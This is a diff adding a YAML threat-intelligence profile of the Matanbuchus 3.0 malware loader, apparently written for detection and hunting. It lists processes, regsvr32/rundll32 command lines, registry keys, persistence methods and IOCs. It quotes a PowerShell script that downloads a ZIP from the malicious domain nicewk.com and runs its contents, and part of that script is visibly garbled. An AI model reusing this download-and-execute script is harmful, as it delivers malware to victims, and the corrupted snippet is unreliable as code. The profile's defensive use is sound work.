@@ -1,0 +1,55 @@
+description: Matanbuchus is a malware loader used in targeted campaigns that have
+  potentially led to ransomware compromises. Matanbuchus 3.0 was recently introduced
+  with significant updates.
+attribution: Unknown
+malware_families:
+- Matanbuchus
+TTPs:
+  processes:
+  - notepad++.exe
+  - regsvr32.exe
+  - rundll32.exe
+  - msiexec.exe
+  - cmd.exe
+  - powershell.exe
+  commandline:
+  - regsvr32 -e n i:\\user\\ <dll_path>
+  - rundll32 dll_path,init_function
+  - msiexec
+  - cmd /Q /K
+  - powershell
+  powershell:
+  - '$url = "https://nicewk.com/update/GUP.zip"
+    $rnd=Get-Random -Maximum 999999
+    $tempzip=Join-Path $env:TEMP (''upcore ''+$rnd+''.zip'')
+    $tempFolder=Join-Path $env:TEMP (''tempfolder ''+$rnd)
+    Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $tempZip
+    Expand-Archive -LiteralPath $tempzip -DestinationPath $tempFolder -Force
+    Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
+    $exe=Get-ChildItem -Path $tempFolder -Filter $fileName -Recurse =-ErrorAction
+    SilentlyCoif ($exe) {Start-Process -FilePath $exe.FullName -WorkingDirectory (Split-Path
+    $exe.FullName)}'
+  registry_keys:
+  - HKCU\\SOFTWARE\\<NewSerialID>
+  image_load: {}
+  network_connections:
+  - executable: skype.exe
+  - destination_address: nicewk.com
+  - port: '443'
+  file_activity:
+  - '%TEMP%\GenericUpdater.exe'
+  - '%TEMP%\GUP.zip'
+  - '%APPDATA\\<SerialID>\\<RandomFileName>.dll'
+  persistence:
+  - Scheduled Task creation via COM and shellcode injection
+  - Registry key under HKCU\\SOFTWARE\\<NewSerialID>
+  pipes: {}
+  process_relations: {}
+IOCs:
+- url: https://nicewk.com/update/GUP.zip
+- domain: nicewk.com
+authors:
+- Michael Gorelik
+reference: https://www.morphisec.com/blog/ransomware-threat-matanbuchus-3-0-maas-levels-up/
+date_of_publication: July 16, 2025
+file_creation_date: July 18, 2025
